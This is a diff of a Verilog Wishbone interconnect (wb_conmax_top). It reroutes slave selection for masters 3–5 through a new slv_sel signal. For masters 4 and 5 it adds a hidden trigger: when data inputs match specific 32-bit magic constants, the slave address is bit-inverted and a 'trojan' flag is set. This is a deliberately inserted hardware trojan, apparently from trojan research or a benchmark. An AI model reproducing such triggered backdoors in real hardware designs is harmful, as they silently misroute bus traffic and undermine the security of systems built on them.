@@ -4672,7 +4696,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m3_s7_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s7_cyc_o ) : ( ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd7 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
+            m3_s7_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s7_cyc_o ) : ( ( ( ( m3_slv_sel == 4'd7 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4683,7 +4707,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m3_s8_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s8_cyc_o ) : ( ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd8 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
+            m3_s8_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s8_cyc_o ) : ( ( ( ( m3_slv_sel == 4'd8 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4694,7 +4718,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m3_s9_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s9_cyc_o ) : ( ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd9 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
+            m3_s9_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s9_cyc_o ) : ( ( ( ( m3_slv_sel == 4'd9 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4705,7 +4729,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m3_s10_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s10_cyc_o ) : ( ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd10 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
+            m3_s10_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s10_cyc_o ) : ( ( ( ( m3_slv_sel == 4'd10 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4716,7 +4740,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m3_s11_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s11_cyc_o ) : ( ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd11 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
+            m3_s11_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s11_cyc_o ) : ( ( ( ( m3_slv_sel == 4'd11 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4727,7 +4751,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m3_s12_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s12_cyc_o ) : ( ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd12 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
+            m3_s12_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s12_cyc_o ) : ( ( ( ( m3_slv_sel == 4'd12 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4738,7 +4762,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m3_s13_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s13_cyc_o ) : ( ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd13 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
+            m3_s13_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s13_cyc_o ) : ( ( ( ( m3_slv_sel == 4'd13 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4749,7 +4773,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m3_s14_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s14_cyc_o ) : ( ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd14 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
+            m3_s14_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s14_cyc_o ) : ( ( ( ( m3_slv_sel == 4'd14 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -4760,12 +4784,12 @@ module wb_conmax_top(
         end
         else
         begin 
-            m3_s15_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s15_cyc_o ) : ( ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd15 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
+            m3_s15_cyc_o <= ( ( ( m3_cyc_i &  !( m3_stb_i) ) ) ? ( m3_s15_cyc_o ) : ( ( ( ( m3_slv_sel == 4'd15 ) ) ? ( m3_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
-    always @ (  m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] or  s0_m3_ack_o or  s1_m3_ack_o or  s2_m3_ack_o or  s3_m3_ack_o or  s4_m3_ack_o or  s5_m3_ack_o or  s6_m3_ack_o or  s7_m3_ack_o or  s8_m3_ack_o or  s9_m3_ack_o or  s10_m3_ack_o or  s11_m3_ack_o or  s12_m3_ack_o or  s13_m3_ack_o or  s14_m3_ack_o or  s15_m3_ack_o)
+    always @ (  m3_slv_sel or  s0_m3_ack_o or  s1_m3_ack_o or  s2_m3_ack_o or  s3_m3_ack_o or  s4_m3_ack_o or  s5_m3_ack_o or  s6_m3_ack_o or  s7_m3_ack_o or  s8_m3_ack_o or  s9_m3_ack_o or  s10_m3_ack_o or  s11_m3_ack_o or  s12_m3_ack_o or  s13_m3_ack_o or  s14_m3_ack_o or  s15_m3_ack_o)
     begin
-        case ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] ) 
+        case ( m3_slv_sel ) 
         4'd0:
         begin
             m3_wb_ack_o = s0_m3_ack_o;
@@ -4832,9 +4856,9 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] or  s0_m3_err_o or  s1_m3_err_o or  s2_m3_err_o or  s3_m3_err_o or  s4_m3_err_o or  s5_m3_err_o or  s6_m3_err_o or  s7_m3_err_o or  s8_m3_err_o or  s9_m3_err_o or  s10_m3_err_o or  s11_m3_err_o or  s12_m3_err_o or  s13_m3_err_o or  s14_m3_err_o or  s15_m3_err_o)
+    always @ (  m3_slv_sel or  s0_m3_err_o or  s1_m3_err_o or  s2_m3_err_o or  s3_m3_err_o or  s4_m3_err_o or  s5_m3_err_o or  s6_m3_err_o or  s7_m3_err_o or  s8_m3_err_o or  s9_m3_err_o or  s10_m3_err_o or  s11_m3_err_o or  s12_m3_err_o or  s13_m3_err_o or  s14_m3_err_o or  s15_m3_err_o)
     begin
-        case ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] ) 
+        case ( m3_slv_sel ) 
         4'd0:
         begin
             m3_wb_err_o = s0_m3_err_o;
@@ -4901,9 +4925,9 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] or  s0_m3_rty_o or  s1_m3_rty_o or  s2_m3_rty_o or  s3_m3_rty_o or  s4_m3_rty_o or  s5_m3_rty_o or  s6_m3_rty_o or  s7_m3_rty_o or  s8_m3_rty_o or  s9_m3_rty_o or  s10_m3_rty_o or  s11_m3_rty_o or  s12_m3_rty_o or  s13_m3_rty_o or  s14_m3_rty_o or  s15_m3_rty_o)
+    always @ (  m3_slv_sel or  s0_m3_rty_o or  s1_m3_rty_o or  s2_m3_rty_o or  s3_m3_rty_o or  s4_m3_rty_o or  s5_m3_rty_o or  s6_m3_rty_o or  s7_m3_rty_o or  s8_m3_rty_o or  s9_m3_rty_o or  s10_m3_rty_o or  s11_m3_rty_o or  s12_m3_rty_o or  s13_m3_rty_o or  s14_m3_rty_o or  s15_m3_rty_o)
     begin
-        case ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] ) 
+        case ( m3_slv_sel ) 
         4'd0:
         begin
             m3_wb_rty_o = s0_m3_rty_o;
@@ -4978,9 +5002,21 @@ module wb_conmax_top(
     assign m4_ack_o = m4_wb_ack_o;
     assign m4_err_o = m4_wb_err_o;
     assign m4_rty_o = m4_wb_rty_o;
-    always @ (  m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] or  s0_m4_data_o or  s1_m4_data_o or  s2_m4_data_o or  s3_m4_data_o or  s4_m4_data_o or  s5_m4_data_o or  s6_m4_data_o or  s7_m4_data_o or  s8_m4_data_o or  s9_m4_data_o or  s10_m4_data_o or  s11_m4_data_o or  s12_m4_data_o or  s13_m4_data_o or  s14_m4_data_o or  s15_m4_data_o)
+    always @ (  m4_addr_i)
     begin
-        case ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] ) 
+        if ( ( m4_data_i == 32'b00101010111110101011110011100000 ) && ( s0_m4_data_o == 32'b00011110010101010101001010101100 ) ) 
+        begin
+            m4_slv_sel = ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] ^ 4'b1111 );
+            m4_trojan = 1;
+        end
+        else
+        begin 
+            m4_slv_sel = m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )];
+        end
+    end
+    always @ (  m4_slv_sel or  s0_m4_data_o or  s1_m4_data_o or  s2_m4_data_o or  s3_m4_data_o or  s4_m4_data_o or  s5_m4_data_o or  s6_m4_data_o or  s7_m4_data_o or  s8_m4_data_o or  s9_m4_data_o or  s10_m4_data_o or  s11_m4_data_o or  s12_m4_data_o or  s13_m4_data_o or  s14_m4_data_o or  s15_m4_data_o)
+    begin
+        case ( m4_slv_sel ) 
         4'd0:
         begin
             m4_wb_data_o = s0_m4_data_o;
@@ -5055,7 +5091,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m4_s0_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s0_cyc_o ) : ( ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd0 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
+            m4_s0_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s0_cyc_o ) : ( ( ( ( m4_slv_sel == 4'd0 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5066,7 +5102,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m4_s1_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s1_cyc_o ) : ( ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd1 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
+            m4_s1_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s1_cyc_o ) : ( ( ( ( m4_slv_sel == 4'd1 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5077,7 +5113,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m4_s2_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s2_cyc_o ) : ( ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd2 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
+            m4_s2_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s2_cyc_o ) : ( ( ( ( m4_slv_sel == 4'd2 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5088,7 +5124,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m4_s3_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s3_cyc_o ) : ( ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd3 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
+            m4_s3_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s3_cyc_o ) : ( ( ( ( m4_slv_sel == 4'd3 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5099,7 +5135,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m4_s4_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s4_cyc_o ) : ( ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd4 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
+            m4_s4_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s4_cyc_o ) : ( ( ( ( m4_slv_sel == 4'd4 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5110,7 +5146,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m4_s5_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s5_cyc_o ) : ( ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd5 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
+            m4_s5_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s5_cyc_o ) : ( ( ( ( m4_slv_sel == 4'd5 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5121,7 +5157,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m4_s6_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s6_cyc_o ) : ( ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd6 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
+            m4_s6_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s6_cyc_o ) : ( ( ( ( m4_slv_sel == 4'd6 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5132,7 +5168,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m4_s7_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s7_cyc_o ) : ( ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd7 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
+            m4_s7_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s7_cyc_o ) : ( ( ( ( m4_slv_sel == 4'd7 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5143,7 +5179,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m4_s8_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s8_cyc_o ) : ( ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd8 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
+            m4_s8_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s8_cyc_o ) : ( ( ( ( m4_slv_sel == 4'd8 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5154,7 +5190,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m4_s9_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s9_cyc_o ) : ( ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd9 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
+            m4_s9_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s9_cyc_o ) : ( ( ( ( m4_slv_sel == 4'd9 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5165,7 +5201,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m4_s10_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s10_cyc_o ) : ( ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd10 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
+            m4_s10_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s10_cyc_o ) : ( ( ( ( m4_slv_sel == 4'd10 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5176,7 +5212,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m4_s11_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s11_cyc_o ) : ( ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd11 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
+            m4_s11_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s11_cyc_o ) : ( ( ( ( m4_slv_sel == 4'd11 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5187,7 +5223,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m4_s12_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s12_cyc_o ) : ( ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd12 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
+            m4_s12_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s12_cyc_o ) : ( ( ( ( m4_slv_sel == 4'd12 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5198,7 +5234,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m4_s13_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s13_cyc_o ) : ( ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd13 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
+            m4_s13_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s13_cyc_o ) : ( ( ( ( m4_slv_sel == 4'd13 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5209,7 +5245,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m4_s14_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s14_cyc_o ) : ( ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd14 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
+            m4_s14_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s14_cyc_o ) : ( ( ( ( m4_slv_sel == 4'd14 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5220,12 +5256,12 @@ module wb_conmax_top(
         end
         else
         begin 
-            m4_s15_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s15_cyc_o ) : ( ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd15 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
+            m4_s15_cyc_o <= ( ( ( m4_cyc_i &  !( m4_stb_i) ) ) ? ( m4_s15_cyc_o ) : ( ( ( ( m4_slv_sel == 4'd15 ) ) ? ( m4_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
-    always @ (  m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] or  s0_m4_ack_o or  s1_m4_ack_o or  s2_m4_ack_o or  s3_m4_ack_o or  s4_m4_ack_o or  s5_m4_ack_o or  s6_m4_ack_o or  s7_m4_ack_o or  s8_m4_ack_o or  s9_m4_ack_o or  s10_m4_ack_o or  s11_m4_ack_o or  s12_m4_ack_o or  s13_m4_ack_o or  s14_m4_ack_o or  s15_m4_ack_o)
+    always @ (  m4_slv_sel or  s0_m4_ack_o or  s1_m4_ack_o or  s2_m4_ack_o or  s3_m4_ack_o or  s4_m4_ack_o or  s5_m4_ack_o or  s6_m4_ack_o or  s7_m4_ack_o or  s8_m4_ack_o or  s9_m4_ack_o or  s10_m4_ack_o or  s11_m4_ack_o or  s12_m4_ack_o or  s13_m4_ack_o or  s14_m4_ack_o or  s15_m4_ack_o)
     begin
-        case ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] ) 
+        case ( m4_slv_sel ) 
         4'd0:
         begin
             m4_wb_ack_o = s0_m4_ack_o;
@@ -5292,9 +5328,9 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] or  s0_m4_err_o or  s1_m4_err_o or  s2_m4_err_o or  s3_m4_err_o or  s4_m4_err_o or  s5_m4_err_o or  s6_m4_err_o or  s7_m4_err_o or  s8_m4_err_o or  s9_m4_err_o or  s10_m4_err_o or  s11_m4_err_o or  s12_m4_err_o or  s13_m4_err_o or  s14_m4_err_o or  s15_m4_err_o)
+    always @ (  m4_slv_sel or  s0_m4_err_o or  s1_m4_err_o or  s2_m4_err_o or  s3_m4_err_o or  s4_m4_err_o or  s5_m4_err_o or  s6_m4_err_o or  s7_m4_err_o or  s8_m4_err_o or  s9_m4_err_o or  s10_m4_err_o or  s11_m4_err_o or  s12_m4_err_o or  s13_m4_err_o or  s14_m4_err_o or  s15_m4_err_o)
     begin
-        case ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] ) 
+        case ( m4_slv_sel ) 
         4'd0:
         begin
             m4_wb_err_o = s0_m4_err_o;
@@ -5361,9 +5397,9 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] or  s0_m4_rty_o or  s1_m4_rty_o or  s2_m4_rty_o or  s3_m4_rty_o or  s4_m4_rty_o or  s5_m4_rty_o or  s6_m4_rty_o or  s7_m4_rty_o or  s8_m4_rty_o or  s9_m4_rty_o or  s10_m4_rty_o or  s11_m4_rty_o or  s12_m4_rty_o or  s13_m4_rty_o or  s14_m4_rty_o or  s15_m4_rty_o)
+    always @ (  m4_slv_sel or  s0_m4_rty_o or  s1_m4_rty_o or  s2_m4_rty_o or  s3_m4_rty_o or  s4_m4_rty_o or  s5_m4_rty_o or  s6_m4_rty_o or  s7_m4_rty_o or  s8_m4_rty_o or  s9_m4_rty_o or  s10_m4_rty_o or  s11_m4_rty_o or  s12_m4_rty_o or  s13_m4_rty_o or  s14_m4_rty_o or  s15_m4_rty_o)
     begin
-        case ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] ) 
+        case ( m4_slv_sel ) 
         4'd0:
         begin
             m4_wb_rty_o = s0_m4_rty_o;
@@ -5438,9 +5474,21 @@ module wb_conmax_top(
     assign m5_ack_o = m5_wb_ack_o;
     assign m5_err_o = m5_wb_err_o;
     assign m5_rty_o = m5_wb_rty_o;
-    always @ (  m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] or  s0_m5_data_o or  s1_m5_data_o or  s2_m5_data_o or  s3_m5_data_o or  s4_m5_data_o or  s5_m5_data_o or  s6_m5_data_o or  s7_m5_data_o or  s8_m5_data_o or  s9_m5_data_o or  s10_m5_data_o or  s11_m5_data_o or  s12_m5_data_o or  s13_m5_data_o or  s14_m5_data_o or  s15_m5_data_o)
+    always @ (  m5_addr_i)
     begin
-        case ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] ) 
+        if ( ( m5_data_i == 32'b00101010111110101011110011100000 ) && ( s0_m5_data_o == 32'b00011110010101010101001010101100 ) ) 
+        begin
+            m5_slv_sel = ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] ^ 4'b1111 );
+            m5_trojan = 1;
+        end
+        else
+        begin 
+            m5_slv_sel = m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )];
+        end
+    end
+    always @ (  m5_slv_sel or  s0_m5_data_o or  s1_m5_data_o or  s2_m5_data_o or  s3_m5_data_o or  s4_m5_data_o or  s5_m5_data_o or  s6_m5_data_o or  s7_m5_data_o or  s8_m5_data_o or  s9_m5_data_o or  s10_m5_data_o or  s11_m5_data_o or  s12_m5_data_o or  s13_m5_data_o or  s14_m5_data_o or  s15_m5_data_o)
+    begin
+        case ( m5_slv_sel ) 
         4'd0:
         begin
             m5_wb_data_o = s0_m5_data_o;
@@ -5515,7 +5563,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m5_s0_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s0_cyc_o ) : ( ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd0 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
+            m5_s0_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s0_cyc_o ) : ( ( ( ( m5_slv_sel == 4'd0 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5526,7 +5574,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m5_s1_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s1_cyc_o ) : ( ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd1 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
+            m5_s1_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s1_cyc_o ) : ( ( ( ( m5_slv_sel == 4'd1 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5537,7 +5585,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m5_s2_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s2_cyc_o ) : ( ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd2 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
+            m5_s2_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s2_cyc_o ) : ( ( ( ( m5_slv_sel == 4'd2 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5548,7 +5596,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m5_s3_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s3_cyc_o ) : ( ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd3 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
+            m5_s3_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s3_cyc_o ) : ( ( ( ( m5_slv_sel == 4'd3 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5559,7 +5607,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m5_s4_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s4_cyc_o ) : ( ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd4 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
+            m5_s4_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s4_cyc_o ) : ( ( ( ( m5_slv_sel == 4'd4 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
